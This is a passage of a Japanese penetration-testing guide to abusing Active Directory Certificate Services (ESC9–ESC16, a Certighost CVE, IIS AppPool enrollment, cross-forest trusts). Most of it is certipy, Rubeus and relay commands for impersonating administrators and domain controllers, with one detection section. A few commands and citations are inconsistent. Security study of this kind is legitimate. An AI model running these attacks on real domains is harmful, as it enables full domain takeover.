`StrongCertificateBindingEnforcement` が `0` として設定されている場合。

**ケース 2**

`CertificateMappingMethods` に `UPN` ビット（`0x4`）が含まれている場合。

### Abuse Case 1

`StrongCertificateBindingEnforcement` が `0` として設定されている場合、`GenericWrite` 権限を持つアカウント A を利用して、任意のアカウント B を compromise できます。

たとえば、`Jane@corp.local` に対する `GenericWrite` 権限を持つ attacker が、`Administrator@corp.local` の compromise を狙っているとします。この手順は ESC9 と同様で、任意の certificate template を利用できます。

まず、`GenericWrite` を悪用して Shadow Credentials を使用し、`Jane` の hash を取得します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane` の `userPrincipalName` は、制約違反を回避するために `@corp.local` の部分を意図的に省略して、`Administrator` に変更されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
これに続いて、client authentication を有効にする certificate が、デフォルトの `User` template を使用して `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` はその後、元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した証明書で認証すると、`Administrator@corp.local` の NT hash が得られます。証明書にドメイン情報が含まれていないため、コマンドでドメインを指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 悪用事例 2

`CertificateMappingMethods` に `UPN` ビットフラグ（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B を compromise できます。これには、マシンアカウントや組み込みのドメイン管理者 `Administrator` も含まれます。

ここでの目標は、`GenericWrite` を利用して `Shadow Credentials` により `Jane` の hash を取得することから始め、`DC$@corp.local` を compromise することです。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`の`userPrincipalName`は、その後`DC$@corp.local`に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
デフォルトの `User` テンプレートを使用して、`Jane` としてクライアント認証用の証明書が要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` は、このプロセス後に元の値に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel 経由で認証するには、Certipy の `-ldap-shell` オプションを使用します。これは、`u:CORP\DC$` として認証に成功したことを示します。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell を介して、`set_rbcd` などのコマンドで Resource-Based Constrained Delegation (RBCD) 攻撃を実行でき、ドメイン コントローラーを侵害できる可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は、`userPrincipalName` がないユーザーアカウント、または `userPrincipalName` が `sAMAccountName` と一致しないユーザーアカウントにも及びます。デフォルトの `Administrator@corp.local` は、昇格された LDAP 権限を持ち、デフォルトでは `userPrincipalName` が存在しないため、主要な標的となります。

## NTLM を ICPR に Relaying - ESC11

### 説明

CA Server に `IF_ENFORCEENCRYPTICERTREQUEST` が設定されていない場合、RPC service 経由で署名なしの NTLM relay attacks を実行できます。[Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy` を使用すると、`Enforce Encryption for Requests` が Disabled かどうかを列挙でき、`certipy` は `ESC11` Vulnerabilities を表示します。
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 悪用シナリオ

リレーサーバーをセットアップする必要があります：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注: domain controllers の場合、DomainController で `-template` を指定する必要があります。

または、[sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用します:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM を使用した ADCS CA への Shell access - ESC12

### Explanation

Administrators は、Certificate Authority を「Yubico YubiHSM2」のような外部デバイスに保存するよう設定できます。

USB device が USB ポート経由で CA server に接続されている場合、または CA server が virtual machine の場合に USB device server が使用されている場合、YubiHSM 内の keys を Key Storage Provider が生成および利用するには、authentication key（「password」と呼ばれることもあります）が必要です。

この key/password は、registry の `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に cleartext で保存されています。

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

Shell access を取得した際に CA の private key が物理 USB device に保存されている場合、その key を復元できます。

まず、CA certificate（これは public です）を取得し、その後：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最後に、certutil の `-sign` コマンドを使用して、CA 証明書とその秘密鍵で任意の新しい証明書を偽造します。

## OID Group Link Abuse - ESC13

### Explanation

`msPKI-Certificate-Policy` 属性を使用すると、発行ポリシーを証明書テンプレートに追加できます。発行ポリシーを担当する `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナーの Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）で検出できます。ポリシーは、このオブジェクトの `msDS-OIDToGroupLink` 属性を使用して AD グループにリンクできます。これにより、証明書を提示したユーザーを、あたかもそのグループのメンバーであるかのようにシステムが認証できるようになります。[Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

つまり、ユーザーが証明書の enroll 権限を持ち、その証明書が OID group にリンクされている場合、ユーザーはこのグループの権限を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用して OIDToGroupLink を見つけます：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

`certipy find` または `Certify.exe find /showAllPermissions` を使用して、ユーザーが利用できる権限を確認します。

`John` に `VulnerableTemplate` への enroll 権限がある場合、ユーザーは `VulnerableGroup` グループの権限を継承できます。

必要なのはテンプレートを指定することだけで、`OIDToGroupLink` 権限を持つ証明書を取得できます。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 脆弱な Certificate Renewal Configuration- ESC14

### 説明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の説明は非常に詳しいものです。以下は原文からの引用です。<sup>[[14]](#references)</sup>

ESC14 は、主に Active Directory のユーザーまたはコンピューターアカウントにある `altSecurityIdentities` 属性の誤用または安全でない設定によって発生する「weak explicit certificate mapping」の脆弱性に対処します。この複数値属性を使用すると、管理者は認証目的で X.509 証明書を AD アカウントに手動で関連付けることができます。この属性に値が設定されている場合、これらの明示的なマッピングは、通常は証明書の SAN に含まれる UPN または DNS 名、あるいは `szOID_NTDS_CA_SECURITY_EXT` security extension に埋め込まれた SID に依存する、デフォルトの証明書マッピングロジックを上書きできます。

`altSecurityIdentities` 属性内で証明書を識別するために使用される文字列値の範囲が広すぎる、推測しやすい、非一意の証明書フィールドに依存している、または spoofing しやすい証明書コンポーネントを使用している場合、「weak」なマッピングとなります。攻撃者が、特権アカウントに対してこのような weak な明示的マッピングと一致する属性を持つ証明書を取得または作成できる場合、その証明書を使用してそのアカウントとして認証し、なりすますことができます。

潜在的に weak な `altSecurityIdentities` マッピング文字列の例は次のとおりです。

- 共通の Subject Common Name (CN) のみによるマッピング: 例: `X509:<S>CN=SomeUser`。攻撃者は、security の低いソースからこの CN を持つ証明書を取得できる可能性があります。
- 具体的な serial number や subject key identifier による追加の限定なしに、汎用的すぎる Issuer Distinguished Names (DN) または Subject DN を使用する: 例: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が正当に取得または forge できる証明書で満たせる可能性のある、その他の予測可能なパターンまたは非暗号学的識別子を使用する（CA を compromise した場合や、ESC1 のような脆弱な template を発見した場合）。

`altSecurityIdentities` 属性は、次のようなさまざまなマッピング形式をサポートします。

- `X509:<I>IssuerDN<S>SubjectDN`（完全な Issuer および Subject DN によるマッピング）
- `X509:<SKI>SubjectKeyIdentifier`（証明書の Subject Key Identifier extension の値によるマッピング）
- `X509:<SR>SerialNumberBackedByIssuerDN`（serial number によるマッピング。Issuer DN によって暗黙的に限定される）- これは標準形式ではなく、通常は `<I>IssuerDN<SR>SerialNumber` です。
- `X509:<RFC822>EmailAddress`（SAN の RFC822 name、通常は email address によるマッピング）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（証明書の raw public key の SHA1 hash によるマッピング - 一般的に strong）

これらのマッピングの security は、マッピング文字列で使用される証明書識別子の具体性、一意性、暗号学的強度に大きく依存します。Domain Controller で strong certificate binding mode が有効になっている場合でも（主に SAN UPN/DNS および SID extension に基づく implicit mapping に影響します）、不適切に設定された `altSecurityIdentities` エントリは、マッピングロジック自体に欠陥がある、または許容範囲が広すぎる場合、なりすましへの直接的な経路となる可能性があります。

### Abuse Scenario

ESC14 は、Active Directory (AD) の **explicit certificate mappings**、特に `altSecurityIdentities` 属性を標的とします。この属性が（意図的または設定ミスによって）設定されている場合、攻撃者はそのマッピングと一致する証明書を提示することで、アカウントになりすますことができます。

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: 攻撃者が対象アカウントの `altSecurityIdentities` 属性への write permission、または対象 AD object に対して次のいずれかの permission を付与する権限を持っている:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*。

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: 対象の `altSecurityIdentities` に weak な X509RFC822 mapping がある。攻撃者は victim の mail attribute を対象の X509RFC822 name と一致するように設定し、victim として certificate を enroll して、それを使用して対象として認証できます。
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: 対象の `altSecurityIdentities` に weak な X509IssuerSubject explicit mapping がある。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、対象の X509IssuerSubject mapping の subject と一致するように設定できます。その後、攻撃者は victim として certificate を enroll し、この certificate を使用して対象として認証できます。
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: 対象の `altSecurityIdentities` に weak な X509SubjectOnly explicit mapping がある。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、対象の X509SubjectOnly mapping の subject と一致するように設定できます。その後、攻撃者は victim として certificate を enroll し、この certificate を使用して対象として認証できます。
### 具体的な操作
#### Scenario A

certificate template `Machine` の certificate を requestする
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
証明書を保存して変換する
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
（証明書を使用して）認証する
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
クリーンアップ（任意）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
より具体的な攻撃シナリオにおける攻撃手法については、以下を参照してください: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc の説明は非常に詳細です。以下は原文からの引用です。<sup>[[15]](#references)</sup>

組み込みのデフォルトのバージョン 1 certificate templates を使用すると、攻撃者は CSR を作成し、template で指定された設定済みの Extended Key Usage attributes よりも優先される application policies を含めることができます。必要なのは enrollment rights だけであり、**_WebServer_** template を使用して client authentication、certificate request agent、および codesigning certificates を生成するために利用できます。

### Abuse

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) には、より詳細な使用例が記載されています。<sup>[[14]](#references)</sup>


CA にパッチが適用されていない場合、Certipy の `find` command を使用して、ESC15 の影響を受ける可能性がある V1 templates を特定できます。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel による直接 Impersonation

**Step 1: 「Client Authentication」Application Policy と対象の UPN を注入して証明書を要求する。** Attacker `attacker@corp.local` は、enrollee-supplied subject を許可する「WebServer」V1 template を使用して `administrator@corp.local` を対象にする。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 「Enrollee supplies subject」が設定された脆弱な V1 template。
- `-application-policies 'Client Authentication'`: OID `1.3.6.1.5.5.7.3.2` を CSR の Application Policies extension に注入します。
- `-upn 'administrator@corp.local'`: impersonation 用に SAN の UPN を設定します。

**Step 2: 取得した certificate を使用して Schannel（LDAPS）経由で Authenticate します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: Enrollment Agent Abuse による PKINIT/Kerberos Impersonation

**Step 1: "Enrollee supplies subject" が設定された V1 template から certificate を要求し、"Certificate Request Agent" Application Policy を注入する。** この certificate は attacker（`attacker@corp.local`）が enrollment agent になるためのものです。ここでは attacker 自身の identity に対する UPN は指定しません。目的は agent capability の取得だからです。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**Step 2: "agent" certificate を使用して、対象の privileged user に代わって certificate を要求します。** これは ESC3-like な step で、Step 1 の certificate を agent certificate として使用します。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Step 3: "on-behalf-of" 証明書を使用して、privileged user として Authenticate する。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA で Security Extension が無効化されている（グローバル）-ESC16

### 解説

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** は、AD CS の設定で、すべての証明書に **szOID_NTDS_CA_SECURITY_EXT** extension を含めることが強制されていない場合に発生するシナリオです。攻撃者はこれを悪用して、次のことを実行できます。

1. **SID binding なし**で証明書をリクエストする。

2. この証明書を使用して、特権の高いアカウント（例：Domain Administrator）になりすますなど、**任意のアカウントとして authentication** を行う。

詳細な原理については、次の記事も参照してください：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

以下では、[このリンク](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)を参照しています。詳細な使用方法を確認するにはクリックしてください。<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) 環境が **ESC16** に対して脆弱かどうかを特定するには、
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Step 1: 被害者アカウントの初期 UPN を読み取る（任意 - 復元用）。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**手順 2: 被害者アカウントの UPN を、標的管理者の `sAMAccountName` に更新します。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Step 3: (必要な場合) 「victim」アカウントの認証情報を取得する（例：Shadow Credentials 経由）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16 に脆弱な CA 上の _任意の適切なクライアント認証テンプレート_（例: "User"）から、「被害者」ユーザーとして証明書を要求します。** CA は ESC16 に対して脆弱であるため、この拡張機能に関するテンプレート固有の設定に関係なく、発行される証明書から SID security extension を自動的に省略します。Kerberos credential cache 環境変数を設定します（shell command）。
```bash
export KRB5CCNAME=victim.ccache
```
次に、証明書を要求します:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Step 5: 「victim」アカウントの UPN を元に戻す。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Step 6: 対象の管理者として認証する。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 解説

**Certighost** は、CA がリクエスト送信者の指定した request attributes を信頼し、発行する証明書に含めるべき identity を解決する **AD CS enrollment chase / callback path** を悪用します。公開 PoC では、細工したリクエストに次の内容が含まれます:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA が接続する attacker-controlled host/IP
- **`rmd`**: impersonate 対象の **target Domain Controller DNS name**

CA がこの chase に従うと、**SMB/LSA (`445`)** および **LDAP (`389`)** 経由で attacker に接続します。attacker は **real machine account**（通常は既定の **`ms-DS-MachineAccountQuota`** により作成）を使用するため、callback session は有効な domain principal として認証されます。一方、rogue services は代わりに **target DC** の identity attributes を返します:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA が **返された identity を、認証済みの callback principal に暗号学的に紐付けていない** 場合、session が attacker-controlled machine account として認証されていても、**Domain Controller** 用の証明書を発行できます。これは概念的に **Certifried** とは異なります。Certifried が `dNSHostName` などの AD attributes を書き換えるのに対し、この手法では **CA callback resolution 中に identity data を置き換えます**。<sup>[[2]](#references)</sup>

**Useful preconditions:**

- 低権限の **domain credentials**
- computer account を **create または reuse** できること
- **CA** から attacker-controlled **ports `389` および `445`** への network reachability
- Vulnerable / unpatched CA request path（**July 14, 2026** の Microsoft update により、**`cdc` に対する DC validation** と **resolved-SID comparison** が追加された）

生成された **`.pfx`** は **PKINIT** に使用でき、**`.ccache`** を生成できます。また、公開 PoC の flow では **target DC NT hash** も取得できます。これは通常、**full domain compromise** に十分です。

### Abuse

公開 PoC は chain 全体を自動化します:<sup>[[1]](#references)</sup>

1. attacker-controlled **machine account** を create または reuse する。
2. `389` および `445` で **rogue LDAP and SMB/LSA listeners** を起動する。
3. attacker-controlled **`cdc`** および target **`rmd`** attributes を含む certificate request を送信する。
4. CA が controlled machine account として rogue listeners に認証するのを待ち、identity lookups には **target DC** の attributes を返す。
5. CA-signed **DC certificate** を受け取り、**PKINIT** に使用する。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoCで使用できる便利な runtime flags:

- `--listener <ip>`: `cdc` で通知される callback IP を明示的に選択する
- `--computer-name <NAME$>`: 新規作成する代わりに、既存の machine account を再利用する

**運用上の注意:**

- PoC は **privileged ports** `389` と `445` に bind するため、**root** が必要。
- Exploitation に成功すると、**DC `.pfx`** と **Kerberos `.ccache`** がローカルに書き込まれる。
- certificate は **Domain Controller account** にマッピングされるため、後続の actions には **certificate-based Kerberos auth**、**DCSync**、および取得した **machine NT hash** の再利用などが含まれる。<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment による同一ホスト上の Administrator

`ApplicationPoolIdentity` として実行される IIS pool は、network resources への outbound access にホストの **computer account** を使用する。そのため、`IIS AppPool\<POOL>` としての code execution は local token 内では low-privileged のままだが、AD CS request を送信する際には CA から `HOST$` として認証される可能性がある。これは token impersonation や Potato-style local elevation ではなく、outbound identity transition である。<sup>[[19]](#references)[[20]](#references)</sup>

この chain には、domain-joined IIS host、RPC 経由で到達可能な Enterprise CA、computer に enrollment rights がある published machine-authentication template、PKINIT support、KDC/SMB reachability が必要となる。custom pool identity は outbound principal を変更するため、`HOST$` を前提とする前に、その pool が実際に `ApplicationPoolIdentity` を使用していることを確認する。<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

IIS server の外部で key pair と CSR を生成し、private key を保持する。compromised worker からは **CSR のみ**を submit する。[Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) は `CertificateAuthority.Request` を instantiate し、`CertificateTemplate:Machine` を設定して `ICertRequest::Submit` を呼び出し、issued certificate を返す。CA configuration string には `CAHOST\CA-NAME` を使用する。通常の `Machine` template は AD から subject を構築するため、requester-supplied subject/SAN data は必要ない。<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

返された certificate と **一致する保持済み key** を組み合わせる。`certutil -MergePFX machine_cert.cer machine_cert.pfx` は、Windows がすでに certificate をアクセス可能な private key に関連付けられる場合にのみ機能する。PEM files が分離している場合は、PKCS#12 を明示的に作成する:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
PFXをPKINITに使用し、返されたコンピューターTGTはすぐにinjectせず、base64のまま保持します:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self + same-host service substitution

S4U2Self により、service は別のユーザーの authorization data を含む、自身宛ての ticket を取得できます。computer TGT があれば、Rubeus は privileged user 用にその ticket を要求し、返された KRB-CRED 内の service name を CIFS に書き換えて inject できます。これはローカルな「delegate to thyself」primitive であり、S4U2Proxy や `msDS-AllowedToDelegateTo` エントリは必要ありません。<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
置換された ticket は、**同じ computer account/key** 上のサービス（ここでは `HOST` 上の CIFS）でのみ使用できます。他のドメインマシンで再利用できる Administrator ticket ではありません。また、ここで示されている結果は Administrator としての特権 SMB/filesystem access であり、ローカルの `NT AUTHORITY\SYSTEM` process を取得するには、別途 remote-execution step が必要です。<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detection and hardening

- CA 上で、Certification Services event **4886**（request received）と **4887**（issued）を関連付け、IIS server account による予期しない `Machine` template requests を特定します。<sup>[[19]](#references)[[24]](#references)</sup>
- DC 上では、certificate pre-authentication が使用された場合、event **4768** に certificate fields が含まれます。web-server account による通常とは異なる PKINIT TGT requests を alert 対象にします。その後、特権を持つ偽装 identity と同じ host に関連する **4769** requests を確認します。Rubeus の `/altservice` は client-side で KRB-CRED service name を書き換えるため、DC-side の 4769 service name が `cifs` であることを必須条件にしないでください。<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` による CA RPC endpoints へのアクセス、予期しない ASPX creation、Kerberos-authenticated による administrative shares へのアクセス、secrets-dumping activity を hunt します。可能な場合は app-tier から CA RPC/KDC/SMB への access を制限し、運用上必要のない computer enrollment rights または machine-authentication templates を削除します。<sup>[[19]](#references)</sup>

## Certificates による Forest の Compromising を Passive Voice で説明

### Compromised CA による Forest Trusts の Breaking

**cross-forest enrollment** の configuration は、比較的容易に行えるように設定されます。resource forest の **root CA certificate** は administrators により **account forests に publish** され、resource forest の **enterprise CA** certificates は各 account forest の **`NTAuthCertificates` および AIA containers に追加** されます。つまり、この構成によって、resource forest の **CA には、自身が PKI を管理する他のすべての forests を完全に制御する権限が与えられます**。この CA が **attackers によって compromised された場合**、resource forest と account forests のすべての users 用 certificates が **攻撃者によって forged される可能性があり**、その結果、forest の security boundary が破られます。<sup>[[6]](#references)</sup>

### Foreign Principals に付与される Enrollment Privileges

multi-forest environments では、**Authenticated Users または foreign principals**（Enterprise CA が所属する forest の外部にいる users/groups）に **enrollment および edit rights** を許可する **certificate templates を publish する Enterprise CAs** について、注意が必要です。\
trust を介した authentication の際、AD により **Authenticated Users SID** が user の token に追加されます。したがって、ある domain が **Authenticated Users enrollment rights を許可する template** を持つ Enterprise CA を有している場合、別の forest の user がその template に **enroll できる可能性があります**。同様に、**enrollment rights が template によって foreign principal に明示的に付与されている場合**、**cross-forest access-control relationship が作成され**、ある forest の principal が別の forest の template に **enroll できるようになります**。

どちらの scenario も、ある forest から別の forest への **attack surface の増加**につながります。certificate template の settings が attacker によって悪用され、foreign domain で追加の privileges を取得される可能性があります。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services の Abuse](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9、ESC10、BloodHound GUI、新しい Authentication および Request Methods など](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover のための Key Trust Account Mapping の Abuse](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage の物語](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC 経由での AD Certificate Services への Relaying](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM による ADCS CA への Shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: ただの別の AD CS ESC ではない](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
